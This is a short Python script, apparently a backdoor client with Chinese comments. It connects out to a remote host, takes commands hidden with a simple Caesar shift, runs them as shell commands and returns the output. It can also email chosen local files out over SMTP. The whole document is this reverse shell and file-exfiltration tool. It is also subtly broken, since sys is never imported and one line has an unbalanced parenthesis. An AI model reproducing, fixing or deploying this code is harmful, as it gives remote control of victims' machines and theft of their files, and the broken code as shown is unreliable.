from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import socket,subprocess,smtplib

def Caesar(i,string1):#凯撒密码加密与解密
    string2 = ""
    if i == 0:#加密
        for a in string1:
            string2 = string2 + chr(ord(a)+4)
    elif i == 1:#解密
        for a in string1:
            string2 = string2 + chr(ord(a)-4)
    return string2
def Shell(cmd):#执行shell
    shell = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    out = shell.stdout.read()
    err = shell.stderr.read()
    out = out.decode()
    err = err.decode()
    if out == "" and err == "":#避免向套间字发送""造成套间字中断
        out = " "
    return out+err
def Email(host,port,name,passwd,file1):
    msg = MIMEMultipart()
    file = MIMEText(open(file1,"rb").read(),"base64","utf-8")
    file["Content-Type"] = "application/octet-stream"
    file["Content-Disposition"] = "attachment;filename = " + file1
    msg.attach(file)
    smtp = smtplib.SMTP()
    smtp.connect(host,port)
    smtp.login(name,passwd)
    smtp.sendmail(name,name,msg.as_string())
    smtp.close()
    return "OK"
if '__main__' == __name__:
    t = socket.socket()
    t.connect((sys.argv[1],int(sys.argv[2]))
    while True:
        cmd = Caesar(1,t.recv(2048).decode()).split(" ",1)
        if cmd[0] == "shell":
            t.send(Caesar(0,Shell(cmd[1])).encode())
        elif cmd[0] == "email":
            cmd = cmd[1].split()
            t.send(Caesar(0,Email(cmd[0],cmd[1],cmd[2],cmd[3],cmd[4])).encode())
        else:
            t.send("SB".encode())
    t.close()
